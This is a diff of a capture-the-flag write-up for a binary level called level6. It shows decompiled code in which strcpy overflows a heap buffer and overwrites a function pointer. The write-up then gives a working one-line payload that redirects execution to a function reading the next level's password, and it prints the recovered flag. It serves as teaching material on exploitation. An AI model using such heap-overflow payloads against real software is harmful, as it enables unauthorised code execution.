@@ -86,17 +86,16 @@ Dump of assembler code for function m:
 End of assembler dump.
 ```
 
+Ghidra : 
 
 ```c
 void n(void)
-
 {
   system("/bin/cat /home/user/level7/.pass");
   return;
 }
 
 void m(void *param_1,int param_2,char *param_3,int param_4,int param_5)
-
 {
   puts("Nope");
   return;
@@ -110,19 +109,16 @@ void main(undefined4 param_1,int param_2)
   
   __dest = (char *)malloc(0x40);
   ppcVar1 = (code **)malloc(4);
-  *ppcVar1 = m;
+  *ppcVar1 = m; // <======================================
   strcpy(__dest,*(char **)(param_2 + 4));
   (**ppcVar1)();
   return;
 }
 ```
 
-
-After a brief reading/try, i assume this.
-
+After a brief reading/try, here is what we can say.
 
 The program store the address of the m funtion in the var ppcVar1 and execute it just before the return, but in order to give the argument of that function, it use strcpy.
-
 
 In GDB i have managed to edit that assignement to the n function, and it execute our cat function
 
@@ -139,23 +135,9 @@ Continuing.
 
 So we need to overwrite that assignement.
 
-
-We can make the program overwrite the EIP at 72 char like so :
-
-```sh
-(gdb) run $(python -c "print 'A' * 72")
-Starting program: /home/user/level6/level6 $(python -c "print 'A' * 72")
-
-Program received signal SIGSEGV, Segmentation fault.
-0x08048408 in __do_global_dtors_aux ()
-```
-
-Easily guessable.
-
 Lets try overwriting the EIP with the address of the n function :
 
-
-```
+```sh
 ./level6 $(python -c "print '\x54\x84\x04\x08' * 72")
 f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 ```
